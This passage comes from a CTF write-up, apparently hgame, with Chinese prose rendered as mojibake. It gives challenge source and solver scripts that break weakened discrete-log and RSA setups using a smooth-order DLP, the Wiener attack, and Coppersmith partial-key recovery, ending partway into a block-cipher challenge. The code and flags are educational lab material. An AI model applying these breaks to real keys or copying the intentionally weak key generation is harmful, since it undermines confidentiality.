= random.randint(<span class="number">2</span>, p)</span><br><span class="line">m = E.lift_x(Integer(bytes_to_long(FLAG)))</span><br><span class="line">P1 = k * G</span><br><span class="line">P2 = k * Pa</span><br><span class="line">c = m + P2</span><br><span class="line">f.write(<span class="string">f&quot;Bob send to Alice: &#123;&#123; <span class="subst">&#123;P1.xy()&#125;</span>, <span class="subst">&#123;c.xy()&#125;</span> &#125;&#125;\n&quot;</span>)</span><br></pre></td></tr></table></figure></blockquote><p>$N$ ä¸ºè´¨æ•°ï¼Œ$N-1$ è¶³å¤Ÿå…‰æ»‘ï¼ŒDLPæ˜“æ±‚ï¼Œå†åˆ©ç”¨ $c=m+P_2=m+kP_a=m+ksG=m+sP_1$ï¼Œä»£å…¥ $c,s,P_1$ æ±‚å¾— $m$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">N = <span class="number">0x2be227c3c0e997310bc6dad4ccfeec793dca4359aef966217a88a27da31ffbcd6bb271780d8ba89e3cf202904efde03c59fef3e362b12e5af5afe8431cde31888211d72cc1a00f7c92cb6adb17ca909c3b84fcad66ac3be724fbcbe13d83bbd3ad50c41a79fcdf04c251be61c0749ea497e65e408dac4bbcb3148db4ad9ca0aa4ee032f2a4d6e6482093aa7133e5b1800001</span></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line">A = <span class="number">0x22888b5ac1e2f490c55d0891f39aab63f74ea689aa3da3e8fd32c1cd774f7ca79538833e9348aebfc8eba16e850bbb94c35641c2e7e7e8cb76032ad068a83742dbc0a1ad3f3bef19f8ae6553f39d8771d43e5f2fcb986bd72459456d073e70d5be4d79ce5f10f76edea01492f11b807ebff0faf6819d62a8e972084e1ed5dd6e0152df2b0477a42246bbaa04389abf639833</span></span><br><span class="line">B = <span class="number">0x1889c9c65147470fdb3ad3cf305dc3461d1553ee2ce645586cf018624fc7d8e566e04d416e684c0c379d5819734fd4a09d80add1b3310d76f42fcb1e2f5aac6bcdd285589b3c2620342deffb73464209130adbd3a444b253fc648b40f0acec7493adcb3be3ee3d71a00a2b121c65b06769aada82cd1432a6270e84f7350cd61dddc17fe14de54ab436f41b9c9a0430510dde</span></span><br><span class="line"></span><br><span class="line">b = discrete_log(mod(B,N),mod(g,N))</span><br><span class="line">s = <span class="built_in">pow</span>(A,b,N)</span><br><span class="line"></span><br><span class="line">p = <span class="number">6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057151</span></span><br><span class="line">a = -<span class="number">3</span></span><br><span class="line">b = <span class="number">1093849038073734274511112390766805569936207598951683748994586394495953116150735016013708737573759623248592132296706313309438452531591012912142327488478985984</span></span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">G = E(<span class="number">6205877918333770287323403670543661734129170085954198767820861962261174202646976379181735257759867760655835711845144326470613882395445975482219869828210975915</span>, <span class="number">3475351956909044812130266914587199895248867449669290021764126870271692995160201860564302206748373950979891071705183465400186006709376501382325624851012261206</span>)</span><br><span class="line">Pa = E(<span class="number">2131916734759224323822132103713450942372127857975491448998753734796387810139407713081623540463771547844600806401723562334185214530516095152824413924854874698</span>, <span class="number">1690322613136671350646569297044951327454506934124656653046321341087958059722809120500999091493097880695888777563486212179798037350151439310538948719271467773</span>)</span><br><span class="line">P1 = E(<span class="number">2032638959575737798553734238953177065671021112450002471824225734491735604600003028491729131445734432442510201955977472408728415227018746467250107080483073647</span>, <span class="number">3510147080793750133751646930018687527128938175786714269902604502700248948154299853980250781583789623838631244520649113071664767897964611902120411142027848868</span>)</span><br><span class="line">c = E(<span class="number">6670373437344180404127983821482178149374116817544688094986412631575854021385459676854475335068369698875988135009698187255523501841013430892133371577987480522</span>, <span class="number">6648964426034677304189862902917458328845484047818707598329079806732346274848955747700716101983207165347315916182076928764076602008846695049181874187707051395</span>)</span><br><span class="line"></span><br><span class="line">m = c - s*P1</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m[<span class="number">0</span>])[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;Weak_p@ramet3r_make_DHKE_broken&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="RSA-å¤§å†’é™©2"><a href="#RSA-å¤§å†’é™©2" class="headerlink" title="RSA å¤§å†’é™©2"></a>RSA å¤§å†’é™©2</h3><blockquote><p>å¥½è€¶ï¼Œåˆæ˜¯å¤§å†’é™©ï¼</p><p>HINTS:</p><p>Challenge 3: pæ³„æ¼çš„ä½æ•°ä¸å¤Ÿå¤šï¼Œå¯¼è‡´coppersmithæ–¹æ³•è§£ä¸å‡ºæ¥ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰ä»€ä¹ˆåŠæ³•èƒ½å¤Ÿæ‰©å¤§coppersmithçš„ç•Œå‘¢ï¼Ÿæ³¨æ„coppersmithæ–¹æ³•ä½¿ç”¨äº†LLLç®—æ³•ï¼Œé‚£ä¹ˆè¿™ä¸ªç•Œå’Œæ ¼åŸºåˆæœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Ÿ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># challenge1.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall1_secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">create_keypair</span>(<span class="params">size</span>):</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                p = getPrime(size // <span class="number">2</span>)</span><br><span class="line">                q = getPrime(size // <span class="number">2</span>)</span><br><span class="line">                <span class="keyword">if</span> q &lt; p &lt; <span class="number">2</span>*q:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            N = p*q</span><br><span class="line">            phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">            max_d = isqrt(isqrt(N)) // <span class="number">3</span></span><br><span class="line">            max_d_bits = max_d.bit_length() - <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                d = getRandomNBitInteger(max_d_bits)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    e = <span class="built_in">int</span>(inverse(d, phi))</span><br><span class="line">                <span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> (e * d) % phi == <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">return</span> N, e, d</span><br><span class="line">        self.N, self.e, self.d = create_keypair(<span class="number">1024</span>)</span><br><span class="line">        self.m = chall1_secret</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_ ,self.e, self.N)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;N&quot;</span>:self.N, <span class="string">&quot;e&quot;</span>:self.e&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># challenge2.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall2_secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">next_prime</span>(<span class="params">p</span>):</span><br><span class="line">    k=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> isPrime(p+k):</span><br><span class="line">            <span class="keyword">return</span> p+k</span><br><span class="line">        k+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">creat_keypair</span>(<span class="params">nbits, beta</span>):</span><br><span class="line">            p = getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">            q = next_prime(p+getRandomNBitInteger(<span class="built_in">int</span>(nbits*beta)))</span><br><span class="line">            N = p*q</span><br><span class="line">            phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                e = getRandomNBitInteger(<span class="number">16</span>)</span><br><span class="line">                <span class="keyword">if</span> GCD(e, phi) == <span class="number">2</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            d = inverse(e, phi)</span><br><span class="line">            <span class="keyword">return</span> N, e, d</span><br><span class="line">        self.N, self.e, self.d = creat_keypair(<span class="number">1024</span>, <span class="number">0.25</span>)</span><br><span class="line">        self.m = chall2_secret</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_, self.e, self.N)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;N&quot;</span>:self.N, <span class="string">&quot;e&quot;</span>:self.e&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># challenge3.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall3_secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">create_keypair</span>(<span class="params">nbits</span>):</span><br><span class="line">            p = getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">            q = getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">            N = p*q</span><br><span class="line">            phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">            e = <span class="number">65537</span></span><br><span class="line">            d = inverse(e, phi)</span><br><span class="line">            leak = p &gt;&gt; <span class="number">253</span></span><br><span class="line">            <span class="keyword">return</span> N, e, d, leak</span><br><span class="line">        self.N, self.e, self.d, self.leak = create_keypair(<span class="number">1024</span>)</span><br><span class="line">        self.m = chall3_secret</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_, self.e, self.N)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;N&quot;</span>:self.N, <span class="string">&quot;e&quot;</span>:self.e, <span class="string">&quot;leak&quot;</span>:self.leak&#125;</span><br></pre></td></tr></table></figure></blockquote><p>æ±‚è§£ä¸‰å±‚RSAæ‹¿flagã€‚</p><p>ç¬¬ä¸€å±‚ï¼Œ$q&lt;p&lt;2q,d&lt;\cfrac{1}{3}N^{\frac{1}{4}}$ï¼Œæ»¡è¶³Wiener Attackæ¡ä»¶ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">factor_rsa_wiener</span>(<span class="params">N, e</span>):</span><br><span class="line">    N = Integer(N)</span><br><span class="line">    e = Integer(e)</span><br><span class="line">    cf = (e / N).continued_fraction().convergents()</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> cf:</span><br><span class="line">        k = f.numer()</span><br><span class="line">        d = f.denom()</span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        phi_N = ((e * d) - <span class="number">1</span>) / k</span><br><span class="line">        b = -(N - phi_N + <span class="number">1</span>)</span><br><span class="line">        dis = b ^ <span class="number">2</span> - <span class="number">4</span> * N</span><br><span class="line">        <span class="keyword">if</span> dis.sign() == <span class="number">1</span>:</span><br><span class="line">            dis_sqrt = sqrt(dis)</span><br><span class="line">            p = (-b + dis_sqrt) / <span class="number">2</span></span><br><span class="line">            q = (-b - dis_sqrt) / <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> p.is_integer() <span class="keyword">and</span> q.is_integer() <span class="keyword">and</span> (p * q) % N == <span class="number">0</span>:</span><br><span class="line">                p = p % N</span><br><span class="line">                q = q % N</span><br><span class="line">                <span class="keyword">if</span> p &gt; q:</span><br><span class="line">                    <span class="keyword">return</span> (p, q)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> (q, p)</span><br><span class="line"></span><br><span class="line">N = <span class="number">137549711547277501490512652253223705009896739033213206450427185227633740625388392382604507796908923883409603222056205390907355567345203551544782114279172864959402320300753748333020687530365352630647687557310169459736318329569719516536939612675375837585785285970788429934265825996569888095986259096503876786157</span></span><br><span class="line">e = <span class="number">93353589564181636718027173778502268418513041301835540045681119331234573983360292187550959060357949657609295815897069024673722589144338487101058734688906424145037973559780521703111302989561973563657725186914522917495401111500951519775376691911667795239110869653121682582184013495282531768528802139272651917441</span></span><br><span class="line">c = <span class="number">0x24e544c4b398ed0812a1739127c026d2b8eeba2b1e5c9221a6debaa9ebfeb134c6dfcbcf3142ec2723b6990d25d4bb0d7f14e4034c4a8be71d46015e6ae65cc8e1872f62860e5b89cd59f48420e9a3e85dcbdf34c850688046026fcf4ffb504baef704ff049f49494bbfb05624a30c542051fada959dff52fefc378489e20c60</span></span><br><span class="line">p, q = factor_rsa_wiener(N, e)</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,N)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b&#x27;wiener_attack_easily!!!&#x27;</span></span><br></pre></td></tr></table></figure><p>ç¬¬äºŒå±‚ï¼Œå·²çŸ¥ $p$ é«˜ä½æ”»å‡»+ $\gcd(e,\varphi)=2$ æƒ…å½¢ï¼Œcoppersmith+AMMç®—æ³•ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">N = <span class="number">68414473664421192639324860086304622601462638941429703900601142401666806262479832339441486761549640560858310048110541758196980937681745306684526118613694088585953109432823793467906611480953093877867597017269693809377188442523548160628479089952031515541299395812090799992365148053327937407652550818853770241959</span></span><br><span class="line">e = <span class="number">62830</span></span><br><span class="line">c = <span class="number">0x520ba82a569ea52f16b84c4415186cd616680131e3ac6eda886fea046b18b0e1326d4acbbfb8840dc8064211cd44c30b91148836048434a3f57dd4ec5a5cdaf005a0f8f2c95ee7d9a739505b01e407acd3441dd088f64a2a0c36e43c520e30bd90bb32ec1125e4bb1f4e7d522596898da22c9a7921ac5da96808ee39c98e131f</span></span><br><span class="line">pbits = <span class="number">512</span></span><br><span class="line"></span><br><span class="line">find = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**i):</span><br><span class="line">        p4 = Integer(gmpy2.iroot(N,<span class="number">2</span>)[<span class="number">0</span>])&gt;&gt;<span class="number">256</span></span><br><span class="line">        p4 = (p4&lt;&lt;i) + j</span><br><span class="line">        kbits = pbits - p4.nbits()</span><br><span class="line">        p4 = p4 &lt;&lt; kbits</span><br><span class="line">        PR.&lt;x&gt; = PolynomialRing(Zmod(N))</span><br><span class="line">        f = x + p4</span><br><span class="line">        roots = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">if</span> roots:</span><br><span class="line">            p = p4+<span class="built_in">int</span>(roots[<span class="number">0</span>]) </span><br><span class="line">            <span class="keyword">if</span> N%p == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(p)</span><br><span class="line">                find = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> find == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">q = N // p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e//<span class="number">2</span>,f)</span><br><span class="line">cc = <span class="built_in">pow</span>(c,d,N)</span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(p),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">f=a^<span class="number">2</span>-cc</span><br><span class="line">mps=f.monic().roots()</span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(q),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">g=a^<span class="number">2</span>-cc</span><br><span class="line">mqs=g.monic().roots()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> mpp <span class="keyword">in</span> mps:</span><br><span class="line">    x=mpp[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> mqq <span class="keyword">in</span> mqs:</span><br><span class="line">        y=mqq[<span class="number">0</span>]</span><br><span class="line">        solution = <span class="built_in">hex</span>(CRT_list([<span class="built_in">int</span>(x), <span class="built_in">int</span>(y)], [p, q]))[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(solution) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(solution))</span><br><span class="line"><span class="comment"># b&#x27;how_to_solve_e_and_phi_uncoprime_condision&#x27;</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰å±‚ï¼Œå·²çŸ¥ $p$ é«˜ä½æ”»å‡»ï¼Œä½†æ³„éœ²ä½æ•°è¿‡å°‘ï¼Œä½çˆ†ç ´+è°ƒèŠ‚å‚æ•°æ‰©å¤§æ ¼èŒƒå›´ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">68340867186438223292118569682710524595966327481168801678255800028919163918249557519447553078528255888326840419621716908729880235244230459900539486879943421761586611726942757775742624070088176246368128990077459966006579285028594729801017390816903003704541109757846868073362640037019813128220657114558520107057</span></span><br><span class="line"></span><br><span class="line">pbits = <span class="number">512</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">2</span>**<span class="number">5</span>):</span><br><span class="line">p4 = <span class="number">531320819410375258952658395582915285878636410772332266245849790153420724865787</span>&lt;&lt;(<span class="number">253</span>-<span class="number">248</span>)</span><br><span class="line">p4 = p4 + i</span><br><span class="line">kbits = pbits - p4.nbits()</span><br><span class="line">p4 = p4 &lt;&lt; kbits</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p4</span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>, epsilon=<span class="number">0.01</span>)</span><br><span class="line"><span class="keyword">if</span> roots:        </span><br><span class="line">p = p4+<span class="built_in">int</span>(roots[<span class="number">0</span>]) </span><br><span class="line"><span class="keyword">if</span> n%p==<span class="number">0</span>:</span><br><span class="line"><span class="built_in">print</span>(i,p)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">q = n//p</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">0x29d543c73f4175f22440eef5954184e9d740cd3785011d560431861ccf6c4ff380d46ad948f9888e8cac2f5e38ce5e994f023d7195b78439b90d53ad23a730cc99b1b75dae1aba416cb6e645c5d135de906be54f344daba47a10492183d03211bfbaa45c09be2bb1913b1453e0538db95c56140cb78dd9c43d21f8312245ef7d</span></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b&#x27;now_you_know_how_to_use_coppersmith&#x27;</span></span><br></pre></td></tr></table></figure><p>ä¸‰æ¬¡æäº¤æ­£ç¡®å¾—flagï¼š<code>hgame&#123;U_mus7_b3_RS4_M@ster!!!&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="ezBlock"><a href="#ezBlock" class="headerlink" title="ezBlock"></a>ezBlock</h3><blockquote><p>å…”å…”æ‹œå¹´çš„æ—¶å€™é‡åˆ°äº† yolande ï¼Œyolande è¯´å¥¹ä¹‹å‰åœ¨å†™å·®åˆ†æ”»å‡»è„šæœ¬ï¼Œé—®å…”å…”è¦ä¸è¦å­¦ä¹ ä¸€ä¸‹ï¼Œè¿˜è¯´å¦‚æœé‡åˆ°é—®é¢˜å¯ä»¥çœ‹çœ‹ The Block Cipher Companion.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s_substitute</span>(<span class="params">m</span>):</span><br><span class="line">    c = <span class="number">0</span></span><br><span class="line">    s_box = &#123;<span class="number">0</span>: <span class="number">0x6</span>, <span class="number">1</span>: <span class="number">0x4</span>, <span class="number">2</span>: <span class="number">0xc</span>, <span class="number">3</span>: <span class="number">0x5</span>, <span class="number">4</span>: <span class="number">0x0</span>, <span class="number">5</span>: <span class="number">0x7</span>, <span 